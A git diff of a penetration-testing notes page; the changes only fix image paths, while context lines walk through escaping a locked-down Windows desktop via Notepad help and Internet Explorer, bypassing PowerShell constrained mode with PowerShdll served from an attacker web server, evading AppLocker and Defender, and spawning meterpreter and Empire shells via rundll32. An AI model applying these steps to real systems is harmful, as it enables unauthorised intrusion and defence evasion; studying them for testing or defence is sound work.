@@ -21,23 +21,23 @@ Learn more from the links at the bottom of this article.
 From the notepad app  
 Click Help -&gt; View help -&gt; triggers Internet Explorer
 
-![](../../.gitbook/assets/viewhelp.png)
+![](../.gitbook/assets/viewhelp.png)
 
 Right click on any link in IE -&gt; save target as -&gt; save as lol.ps1 on the Desktop
 
-![](../../.gitbook/assets/lolps1.png)  
+![](../.gitbook/assets/lolps1.png)  
 Press view downloads in IE, press the dropdown on the file, open with -&gt; notepad. then just write powershell.exe in the file and save again
 
 Now right click -&gt; "save target as" in IE again. Go to the dropdown "save as type" and select "all files". The ps1-file you have saved will be revealed and you can just press "run with powershell" and a powershell prompt should pop up. This shell should be in Constrained mode. Verify with `$ExecutionContext.SessionState.LanguageMode`, which should say `ConstrainedLanguage`.
 
-![](../../.gitbook/assets/runwithps.png)
+![](../.gitbook/assets/runwithps.png)
 
 #### Bypssing PoSh constrained mode
 
 Download PowerShdll from [https://github.com/p3nt4/PowerShdll](https://github.com/p3nt4/PowerShdll)  
 Host powershdll.dll on Kali web server using `python -m SimpleHTTPServer 80`  
 Navigate to the following URL in IE where [http://10.7.253.10/PowerShdll.dll](http://10.7.253.10/PowerShdll.dll)  
-Save as -&gt; PowerShdll.dll to whatever folder you like. `C:\Windows\Tasks` is generally nice to use when Applocker is installed because it is usually whitelisted. But navigating to folders might also be restricted, so in certain ocassions you might need to save to `C:\Users\Username\Desktop`![](../../.gitbook/assets/dlpowershdll.png)
+Save as -&gt; PowerShdll.dll to whatever folder you like. `C:\Windows\Tasks` is generally nice to use when Applocker is installed because it is usually whitelisted. But navigating to folders might also be restricted, so in certain ocassions you might need to save to `C:\Users\Username\Desktop`![](../.gitbook/assets/dlpowershdll.png)
 
 I'm not sure exactly how to check for DLL rules in an Applocked environment yet.
 
@@ -49,7 +49,7 @@ Verify that constrained language mode has been bypassed with
 `$ExecutionContext.SessionState.LanguageMode`  
 It should say FullLanguage
 
-![](../../.gitbook/assets/powershdll.png)
+![](../.gitbook/assets/powershdll.png)
 
 **Shortcut**
 
@@ -64,7 +64,7 @@ If you are lucky, Defender doesn't pick it up and you get an Empire shell / agen
 
 I realize after the fact that this is exactly the same steps as using msf below, just fewer hoops.
 
-![](../../.gitbook/assets/shortcut.png)
+![](../.gitbook/assets/shortcut.png)
 
 #### Getting meterpreter shell
 
@@ -85,7 +85,7 @@ exploit
 ```
 
 Download the msf.dll using the IE "save as" trick from before.  
-![](../../.gitbook/assets/dll.png)
+![](../.gitbook/assets/dll.png)
 
 For some reason I am not sure why the dll payload is not eaten by Windows Defender, not on disk and not when executed. It could possibly be the x64 signature of the payload is not yet recgonized as malware by Defender.
 
@@ -95,7 +95,7 @@ Now, use rundll32 to execute the dll. We use this because rundll32 is a binary t
 
 Shell should now spawn in msf.
 
-![](../../.gitbook/assets/msfshell.png)
+![](../.gitbook/assets/msfshell.png)
 
 #### Empire without powershell.exe
 
@@ -122,9 +122,9 @@ powershell_shell
 
 Copypaste the empire listener in the interactive shell, and an agent should spawn in Empire.
 
-![](../../.gitbook/assets/powershell_shell.png)
+![](../.gitbook/assets/powershell_shell.png)
 
-![](../../.gitbook/assets/empireagent.png)
+![](../.gitbook/assets/empireagent.png)
 
 Congratulations!
 
